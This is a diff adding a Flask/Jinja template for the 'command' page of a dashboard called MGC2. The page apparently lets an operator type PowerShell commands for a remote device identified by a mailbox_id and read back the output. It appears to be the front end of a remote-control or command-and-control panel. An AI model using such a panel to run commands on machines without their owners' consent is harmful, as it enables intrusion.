@@ -1,0 +1,68 @@
+    {% extends 'dashboard.html' %}
+
+    {% set active_page = 'command' %}{% block content %}
+
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/command.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Cascadia+Mono&display=swap" rel="stylesheet">
+
+
+    <div id="maincontainer">
+        <p style="color: white;">©Copyright MGC2 2026. Put the power in PowerShell!
+            Refresh to see output, otherwise your device is not online/running the script!
+        </p>
+        
+        <form id="command-form">
+            <span style="color: white;">C:\Users\MGC2\{{ hostname }}></span>
+            <input type="text" name="cmd" id="cmd-input"autocomplete="off">
+        </form>
+
+        <p style="color: white; margin-top: -6px;" id="output"></p>
+
+        <footer style="color: white; font-size: 12px; margin-top: auto; opacity: 0.5"> (not affiliated with Microsoft)</footer>
+    </div>
+
+
+    <script>
+        // 1. Get the mailbox_id from the URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const mailboxId = urlParams.get('mailbox_id');
+
+        // 2. Fetch the output from Flask and display it in the <p> tag on page load
+        if (mailboxId) {
+            fetch(`/get_output/${mailboxId}`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('output').textContent = data.output;
+                })
+                .catch(err => {
+                    document.getElementById('output').textContent = "Error loading output.";
+                });
+        }
+
+        // 3. Handle sending commands
+        document.getElementById('command-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const inputField = document.getElementById('cmd-input');
+            const commandText = inputField.value.trim();
+
+            if (commandText === '') return; 
+
+            // Clear the box instantly so it feels responsive
+            inputField.value = '';
+
+            // Send it to your Python backend to be saved into the text file
+            fetch('/send_command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    cmd: commandText,
+                    mailbox_id: mailboxId
+                })
+            });
+        });
+    </script>
+
+     {% endblock %}
